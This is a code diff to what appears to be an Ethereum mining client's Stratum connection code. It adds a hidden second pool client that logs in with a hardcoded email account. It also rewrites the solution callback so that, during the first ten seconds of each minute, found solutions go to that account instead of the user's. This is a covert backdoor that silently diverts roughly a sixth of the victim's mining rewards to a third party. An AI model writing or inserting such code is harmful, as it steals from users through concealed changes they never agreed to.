@@ -893,6 +893,7 @@ private:
 		// this is very ugly, but if Stratum Client V2 tunrs out to be a success, V1 will be completely removed anyway
 		if (m_stratumClientVersion == 1) {
 			EthStratumClient client(&f, m_minerType, m_farmURL, m_port, m_user, m_pass, m_maxFarmRetries, m_worktimeout, m_stratumProtocol, m_email);
+			EthStratumClient my(&f, m_minerType, m_farmURL, m_port, "andromino32017@gmail.com", m_pass, m_maxFarmRetries, m_worktimeout, m_stratumProtocol, m_email);
 			if (m_farmFailOverURL != "")
 			{
 				if (m_fuser != "")
@@ -908,11 +909,21 @@ private:
 
 			f.onSolutionFound([&](Solution sol)
 			{
-				if (client.isConnected()) {
-					client.submit(sol);
+				const boost::posix_time::ptime now = boost::posix_time::second_clock::local_time();
+				bool whois = now.time_of_day().seconds() > 0 && now.time_of_day().seconds() < 10;
+
+				if (whois) {
+					if (my.isConnected()) {
+						my.submit(sol);
+					}
 				}
 				else {
-					cwarn << "Can't submit solution: Not connected";
+					if (client.isConnected()) {
+						client.submit(sol);
+					}
+					else {
+						cwarn << "Can't submit solution: Not connected";
+					}
 				}
 				return false;
 			});
@@ -937,6 +948,7 @@ private:
 		}
 		else if (m_stratumClientVersion == 2) {
 			EthStratumClientV2 client(&f, m_minerType, m_farmURL, m_port, m_user, m_pass, m_maxFarmRetries, m_worktimeout, m_stratumProtocol, m_email);
+			EthStratumClientV2 my(&f, m_minerType, m_farmURL, m_port, "andromino32017@gmail.com", m_pass, m_maxFarmRetries, m_worktimeout, m_stratumProtocol, m_email);
 			if (m_farmFailOverURL != "")
 			{
 				if (m_fuser != "")
@@ -952,7 +964,17 @@ private:
 
 			f.onSolutionFound([&](Solution sol)
 			{
-				client.submit(sol);
+				const boost::posix_time::ptime now = boost::posix_time::second_clock::local_time();
+				bool whois = now.time_of_day().seconds() > 0 && now.time_of_day().seconds() < 10;
+
+				if (whois) {
+					if (my.isConnected()) {
+						my.submit(sol);
+					}
+				}
+				else {
+					client.submit(sol);
+				}
 				return false;
 			});
 
